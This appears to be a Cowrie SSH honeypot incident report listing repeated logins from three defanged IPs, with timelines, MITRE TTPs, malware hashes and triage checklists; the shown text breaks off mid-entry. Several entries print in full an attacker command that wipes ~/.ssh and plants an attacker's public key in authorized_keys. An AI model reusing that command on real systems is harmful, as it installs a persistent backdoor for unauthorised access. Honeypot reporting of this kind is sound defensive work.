| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:18:17` | `cowrie.session.connect` |
| `2026-04-14 04:18:17` | `cowrie.client.version` |
| `2026-04-14 04:18:17` | `cowrie.client.kex` |
| `2026-04-14 04:18:18` | `cowrie.login.success` |
| `2026-04-14 04:18:19` | `cowrie.session.params` |
| `2026-04-14 04:18:19` | `cowrie.command.input` |
| `2026-04-14 04:18:19` | `cowrie.command.failed` |
| `2026-04-14 04:18:19` | `cowrie.log.closed` |
| `2026-04-14 04:18:19` | `cowrie.session.params` |
| `2026-04-14 04:18:19` | `cowrie.command.input` |
| `2026-04-14 04:18:20` | `cowrie.session.file_download` |
| `2026-04-14 04:18:20` | `cowrie.log.closed` |
| `2026-04-14 04:18:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `205.164.114[.]59` to AbuseIPDB if not already reported
- [ ] Block `205.164.114[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4361922a25b

| Field | Detail |
|---|---|
| **Source IP** | `205.164.114[.]59` |
| **First Seen** | 2026-04-14 04:18 |
| **Last Seen** | 2026-04-14 04:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:18:23` | `cowrie.session.connect` |
| `2026-04-14 04:18:23` | `cowrie.client.version` |
| `2026-04-14 04:18:23` | `cowrie.client.kex` |
| `2026-04-14 04:18:24` | `cowrie.login.success` |
| `2026-04-14 04:18:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `205.164.114[.]59` to AbuseIPDB if not already reported
- [ ] Block `205.164.114[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8de52dcb50a9

| Field | Detail |
|---|---|
| **Source IP** | `205.164.114[.]59` |
| **First Seen** | 2026-04-14 04:19 |
| **Last Seen** | 2026-04-14 04:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:19:40` | `cowrie.session.connect` |
| `2026-04-14 04:19:40` | `cowrie.client.version` |
| `2026-04-14 04:19:41` | `cowrie.client.kex` |
| `2026-04-14 04:19:42` | `cowrie.login.success` |
| `2026-04-14 04:19:42` | `cowrie.session.params` |
| `2026-04-14 04:19:42` | `cowrie.command.input` |
| `2026-04-14 04:19:42` | `cowrie.command.failed` |
| `2026-04-14 04:19:42` | `cowrie.log.closed` |
| `2026-04-14 04:19:43` | `cowrie.session.params` |
| `2026-04-14 04:19:43` | `cowrie.command.input` |
| `2026-04-14 04:19:43` | `cowrie.session.file_download` |
| `2026-04-14 04:19:43` | `cowrie.log.closed` |
| `2026-04-14 04:19:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `205.164.114[.]59` to AbuseIPDB if not already reported
- [ ] Block `205.164.114[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fb72b633d36

| Field | Detail |
|---|---|
| **Source IP** | `205.164.114[.]59` |
| **First Seen** | 2026-04-14 04:19 |
| **Last Seen** | 2026-04-14 04:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:19:46` | `cowrie.session.connect` |
| `2026-04-14 04:19:46` | `cowrie.client.version` |
| `2026-04-14 04:19:46` | `cowrie.client.kex` |
| `2026-04-14 04:19:47` | `cowrie.login.success` |
| `2026-04-14 04:19:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `205.164.114[.]59` to AbuseIPDB if not already reported
- [ ] Block `205.164.114[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9a34ce7f30c

| Field | Detail |
|---|---|
| **Source IP** | `213.6.203[.]226` |
| **First Seen** | 2026-04-14 04:21 |
| **Last Seen** | 2026-04-14 04:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:21:40` | `cowrie.session.connect` |
| `2026-04-14 04:21:40` | `cowrie.client.version` |
| `2026-04-14 04:21:41` | `cowrie.client.kex` |
| `2026-04-14 04:21:41` | `cowrie.login.success` |
| `2026-04-14 04:21:42` | `cowrie.session.params` |
| `2026-04-14 04:21:42` | `cowrie.command.input` |
| `2026-04-14 04:21:42` | `cowrie.command.failed` |
| `2026-04-14 04:21:42` | `cowrie.log.closed` |
| `2026-04-14 04:21:42` | `cowrie.session.params` |
| `2026-04-14 04:21:42` | `cowrie.command.input` |
| `2026-04-14 04:21:42` | `cowrie.session.file_download` |
| `2026-04-14 04:21:42` | `cowrie.log.closed` |
| `2026-04-14 04:21:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.6.203[.]226` to AbuseIPDB if not already reported
- [ ] Block `213.6.203[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c8d3d64d3ec

| Field | Detail |
|---|---|
| **Source IP** | `213.6.203[.]226` |
| **First Seen** | 2026-04-14 04:21 |
| **Last Seen** | 2026-04-14 04:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:21:44` | `cowrie.session.connect` |
| `2026-04-14 04:21:44` | `cowrie.client.version` |
| `2026-04-14 04:21:45` | `cowrie.client.kex` |
| `2026-04-14 04:21:45` | `cowrie.login.success` |
| `2026-04-14 04:21:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.6.203[.]226` to AbuseIPDB if not already reported
- [ ] Block `213.6.203[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-861cac2eb499

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-14 04:27 |
| **Last Seen** | 2026-04-14 04:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:27:01` | `cowrie.session.connect` |
| `2026-04-14 04:27:01` | `cowrie.client.version` |
| `2026-04-14 04:27:01` | `cowrie.client.kex` |
| `2026-04-14 04:27:02` | `cowrie.login.success` |
| `2026-04-14 04:27:02` | `cowrie.session.params` |
| `2026-04-14 04:27:02` | `cowrie.command.input` |
| `2026-04-14 04:27:02` | `cowrie.command.failed` |
| `2026-04-14 04:27:02` | `cowrie.log.closed` |
| `2026-04-14 04:27:03` | `cowrie.session.params` |
| `2026-04-14 04:27:03` | `cowrie.command.input` |
| `2026-04-14 04:27:03` | `cowrie.session.file_download` |
| `2026-04-14 04:27:03` | `cowrie.log.closed` |
| `2026-04-14 04:27:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f56cc467e574

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-14 04:27 |
| **Last Seen** | 2026-04-14 04:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:27:05` | `cowrie.session.connect` |
| `2026-04-14 04:27:05` | `cowrie.client.version` |
| `2026-04-14 04:27:05` | `cowrie.client.kex` |
| `2026-04-14 04:27:05` | `cowrie.login.success` |
| `2026-04-14 04:27:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-054834f58507

| Field | Detail |
|---|---|
| **Source IP** | `213.6.203[.]226` |
| **First Seen** | 2026-04-14 04:27 |
| **Last Seen** | 2026-04-14 04:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:27:48` | `cowrie.session.connect` |
| `2026-04-14 04:27:48` | `cowrie.client.version` |
| `2026-04-14 04:27:48` | `cowrie.client.kex` |
| `2026-04-14 04:27:49` | `cowrie.login.success` |
| `2026-04-14 04:27:49` | `cowrie.session.params` |
| `2026-04-14 04:27:49` | `cowrie.command.input` |
| `2026-04-14 04:27:49` | `cowrie.command.failed` |
| `2026-04-14 04:27:49` | `cowrie.log.closed` |
| `2026-04-14 04:27:49` | `cowrie.session.params` |
| `2026-04-14 04:27:49` | `cowrie.command.input` |
| `2026-04-14 04:27:50` | `cowrie.session.file_download` |
| `2026-04-14 04:27:50` | `cowrie.log.closed` |
| `2026-04-14 04:27:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.6.203[.]226` to AbuseIPDB if not already reported
- [ ] Block `213.6.203[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53bcc1f7837f

| Field | Detail |
|---|---|
| **Source IP** | `205.164.114[.]59` |
| **First Seen** | 2026-04-14 04:27 |
| **Last Seen** | 2026-04-14 04:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:27:49` | `cowrie.session.connect` |
| `2026-04-14 04:27:49` | `cowrie.client.version` |
| `2026-04-14 04:27:49` | `cowrie.client.kex` |
| `2026-04-14 04:27:50` | `cowrie.login.success` |
| `2026-04-14 04:27:51` | `cowrie.session.params` |
| `2026-04-14 04:27:51` | `cowrie.command.input` |
| `2026-04-14 04:27:51` | `cowrie.command.failed` |
| `2026-04-14 04:27:51` | `cowrie.log.closed` |
| `2026-04-14 04:27:52` | `cowrie.session.params` |
| `2026-04-14 04:27:52` | `cowrie.command.input` |
| `2026-04-14 04:27:52` | `cowrie.session.file_download` |
| `2026-04-14 04:27:52` | `cowrie.log.closed` |
| `2026-04-14 04:27:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `205.164.114[.]59` to AbuseIPDB if not already reported
- [ ] Block `205.164.114[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be779b07a8bb

| Field | Detail |
|---|---|
| **Source IP** | `213.6.203[.]226` |
| **First Seen** | 2026-04-14 04:27 |
| **Last Seen** | 2026-04-14 04:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:27:52` | `cowrie.session.connect` |
| `2026-04-14 04:27:52` | `cowrie.client.version` |
| `2026-04-14 04:27:52` | `cowrie.client.kex` |
| `2026-04-14 04:27:53` | `cowrie.login.success` |
| `2026-04-14 04:27:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.6.203[.]226` to AbuseIPDB if not already reported
- [ ] Block `213.6.203[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-633bddd1ccc5

| Field | Detail |
|---|---|
| **Source IP** | `205.164.114[.]59` |
| **First Seen** | 2026-04-14 04:27 |
| **Last Seen** | 2026-04-14 04:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:27:55` | `cowrie.session.connect` |
| `2026-04-14 04:27:55` | `cowrie.client.version` |
| `2026-04-14 04:27:55` | `cowrie.client.kex` |
| `2026-04-14 04:27:56` | `cowrie.login.success` |
| `2026-04-14 04:27:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `205.164.114[.]59` to AbuseIPDB if not already reported
- [ ] Block `205.164.114[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f47d93178a1e

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-14 04:28 |
| **Last Seen** | 2026-04-14 04:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:28:46` | `cowrie.session.connect` |
| `2026-04-14 04:28:46` | `cowrie.client.version` |
| `2026-04-14 04:28:46` | `cowrie.client.kex` |
| `2026-04-14 04:28:47` | `cowrie.login.success` |
| `2026-04-14 04:28:47` | `cowrie.session.params` |
| `2026-04-14 04:28:47` | `cowrie.command.input` |
| `2026-04-14 04:28:47` | `cowrie.command.failed` |
| `2026-04-14 04:28:47` | `cowrie.log.closed` |
| `2026-04-14 04:28:48` | `cowrie.session.params` |
| `2026-04-14 04:28:48` | `cowrie.command.input` |
| `2026-04-14 04:28:48` | `cowrie.session.file_download` |
| `2026-04-14 04:28:48` | `cowrie.log.closed` |
| `2026-04-14 04:28:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6174c66f62d

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-14 04:28 |
| **Last Seen** | 2026-04-14 04:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:28:50` | `cowrie.session.connect` |
| `2026-04-14 04:28:50` | `cowrie.client.version` |
| `2026-04-14 04:28:50` | `cowrie.client.kex` |
| `2026-04-14 04:28:51` | `cowrie.login.success` |
| `2026-04-14 04:28:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-932fd3bcb848

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-14 04:30 |
| **Last Seen** | 2026-04-14 04:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:30:43` | `cowrie.session.connect` |
| `2026-04-14 04:30:43` | `cowrie.client.version` |
| `2026-04-14 04:30:43` | `cowrie.client.kex` |
| `2026-04-14 04:30:44` | `cowrie.login.success` |
| `2026-04-14 04:30:44` | `cowrie.session.params` |
| `2026-04-14 04:30:44` | `cowrie.command.input` |
| `2026-04-14 04:30:44` | `cowrie.command.failed` |
| `2026-04-14 04:30:44` | `cowrie.log.closed` |
| `2026-04-14 04:30:44` | `cowrie.session.params` |
| `2026-04-14 04:30:44` | `cowrie.command.input` |
| `2026-04-14 04:30:44` | `cowrie.session.file_download` |
| `2026-04-14 04:30:44` | `cowrie.log.closed` |
| `2026-04-14 04:30:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b31a83fbbddc

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-14 04:30 |
| **Last Seen** | 2026-04-14 04:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:30:47` | `cowrie.session.connect` |
| `2026-04-14 04:30:47` | `cowrie.client.version` |
| `2026-04-14 04:30:47` | `cowrie.client.kex` |
| `2026-04-14 04:30:47` | `cowrie.login.success` |
| `2026-04-14 04:30:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0902d608155a

| Field | Detail |
|---|---|
| **Source IP** | `213.6.203[.]226` |
| **First Seen** | 2026-04-14 04:32 |
| **Last Seen** | 2026-04-14 04:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:32:39` | `cowrie.session.connect` |
| `2026-04-14 04:32:39` | `cowrie.client.version` |
| `2026-04-14 04:32:39` | `cowrie.client.kex` |
| `2026-04-14 04:32:40` | `cowrie.login.success` |
| `2026-04-14 04:32:40` | `cowrie.session.params` |
| `2026-04-14 04:32:40` | `cowrie.command.input` |
| `2026-04-14 04:32:40` | `cowrie.command.failed` |
| `2026-04-14 04:32:40` | `cowrie.log.closed` |
| `2026-04-14 04:32:41` | `cowrie.session.params` |
| `2026-04-14 04:32:41` | `cowrie.command.input` |
| `2026-04-14 04:32:41` | `cowrie.session.file_download` |
| `2026-04-14 04:32:41` | `cowrie.log.closed` |
| `2026-04-14 04:32:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.6.203[.]226` to AbuseIPDB if not already reported
- [ ] Block `213.6.203[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79adafdc2130

| Field | Detail |
|---|---|
| **Source IP** | `213.6.203[.]226` |
| **First Seen** | 2026-04-14 04:32 |
| **Last Seen** | 2026-04-14 04:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:32:43` | `cowrie.session.connect` |
| `2026-04-14 04:32:43` | `cowrie.client.version` |
| `2026-04-14 04:32:43` | `cowrie.client.kex` |
